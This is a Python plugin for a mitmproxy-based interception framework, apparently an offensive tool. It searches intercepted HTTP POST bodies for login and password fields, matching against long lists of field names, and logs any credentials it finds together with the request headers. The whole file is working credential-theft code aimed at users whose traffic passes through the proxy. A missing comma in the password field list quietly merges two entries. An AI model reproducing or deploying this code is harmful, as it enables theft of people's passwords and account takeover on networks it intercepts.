from plugins.plugin import PluginTemplate
from mitmproxy.models import decoded
import re

class PasswordCapture(PluginTemplate):
    name    = 'PasswordCapture'
    version = '1.0'
    desc    = 'Getting HTTP post data capture login post and logout pre event hook and its its working in web'

    def get_password_POST(self, content):
        user = None
        passwd = None

        # Taken mainly from Pcredz by Laurent Gaffie
        userfields = ['log','login', 'wpname', 'ahd_username', 'unickname', 'nickname', 'user', 'user_name',
                      'alias', 'pseudo', 'email', 'username', '_username', 'userid', 'form_loginname', 'loginname',
                      'login_id', 'loginid', 'session_key', 'sessionkey', 'pop_login', 'uid', 'id', 'user_id', 'screename',
                      'uname', 'ulogin', 'acctname', 'account', 'member', 'mailaddress', 'membername', 'login_username',
                      'login_email', 'loginusername', 'loginemail', 'uin', 'sign-in']
        passfields = ['ahd_password', 'pass', 'password', '_password', 'passwd', 'session_password', 'sessionpassword',
                      'login_password', 'loginpassword', 'form_pw', 'pw', 'userpassword', 'pwd', 'upassword', 'login_password'
                      'passwort', 'passwrd', 'wppassword', 'upasswd']

        for login in userfields:
            login_re = re.search('(%s=[^&]+)' % login, content, re.IGNORECASE)
            if login_re:
                user = login_re.group()
        for passfield in passfields:
            pass_re = re.search('(%s=[^&]+)' % passfield, content, re.IGNORECASE)
            if pass_re:
                passwd = pass_re.group()

        if user and passwd:
            return (user, passwd)

    def request(self, flow):
        self.log.info("FOR: " + flow.request.url +" "+ flow.request.method + " " + flow.request.path + " " + flow.request.http_version)
        with decoded(flow.request):
            user_passwd = self.get_password_POST(flow.request.content)
            if user_passwd != None:
                try:
                    http_user = user_passwd[0].decode('utf8')
                    http_pass = user_passwd[1].decode('utf8')
                    # Set a limit on how long they can be prevent false+
                    if len(http_user) > 75 or len(http_pass) > 75:
                        return
                    self.log.info("\n[HTTP REQUEST HEADERS]\n")
                    for name, valur in flow.request.headers.iteritems():
                        self.log.info('{}: {}'.format(name,valur))
                    self.log.info('\n')
                    self.log.info( 'HTTP username: %s' % http_user)
                    self.log.info( 'HTTP password: %s\n' % http_pass)
                except UnicodeDecodeError:
                    pass
        self.log.info('\n')

    def response(self, flow):
        pass